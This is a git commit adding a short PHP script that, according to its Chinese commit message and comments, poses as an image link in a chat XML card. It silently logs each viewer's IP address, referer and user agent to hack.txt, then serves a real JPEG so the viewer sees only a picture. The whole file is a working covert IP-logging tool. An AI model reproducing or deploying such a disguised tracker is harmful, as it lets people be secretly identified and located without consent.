dba22aaac09ad010535aba94b6d08b38e74c96c6
YS_Neko <41314905+YS-Neko@users.noreply.github.com>
2020-02-27 20:31:16 +0800

    Create iptest.php
    伪造成xml卡片中的图片地址

---
+++ iptest.php
@@ -0,0 +1,50 @@
+<?php 
+    function filter_dangerous_words($str){
+        $str = str_replace("'", "‘", $str);
+        $str = str_replace("\"", "“", $str);
+        $str = str_replace("<", "《", $str);
+        $str = str_replace(">", "》", $str);
+        return $str;
+    }
+    function getIP() {
+        if (getenv('HTTP_CLIENT_IP')) {
+        $ip = getenv('HTTP_CLIENT_IP');
+        }
+        elseif (getenv('HTTP_X_FORWARDED_FOR')) {
+        $ip = getenv('HTTP_X_FORWARDED_FOR');
+        }
+        elseif (getenv('HTTP_X_FORWARDED')) {
+        $ip = getenv('HTTP_X_FORWARDED');
+        }
+        elseif (getenv('HTTP_FORWARDED_FOR')) {
+        $ip = getenv('HTTP_FORWARDED_FOR');
+ 
+        }
+        elseif (getenv('HTTP_FORWARDED')) {
+        $ip = getenv('HTTP_FORWARDED');
+        }
+        else {
+        $ip = $_SERVER['REMOTE_ADDR'];
+        }
+        return $ip;
+    }
+ 
+    $ip = getIP();
+    @$referer = $_SERVER['HTTP_REFERER']."\r\n";
+    $ua = $_SERVER['HTTP_USER_AGENT']."\r\n\r\n";
+    date_default_timezone_set("Asia/Shanghai");
+    $date_ = date("Y.m.d,h:i:sa")."\r\n";
+ 
+//记录后台地址等信息
+    $hack = 'date: '.$date_.'ip:'.$ip."\r\n".'referer: '.$referer.'ua: '.$ua;
+    $hack = filter_dangerous_words($hack);
+    $op = fopen('hack.txt','a+');
+    fwrite($op,$hack);
+    fclose($op);
+ 
+//伪装成图片
+    $im = imagecreatefromjpeg("2.jpg");//注意该目录下，也要有2.jpg这个图片
+    header('Content-Type: image/jpeg');
+    imagejpeg($im);
+    imagedestroy($im);
+ ?>
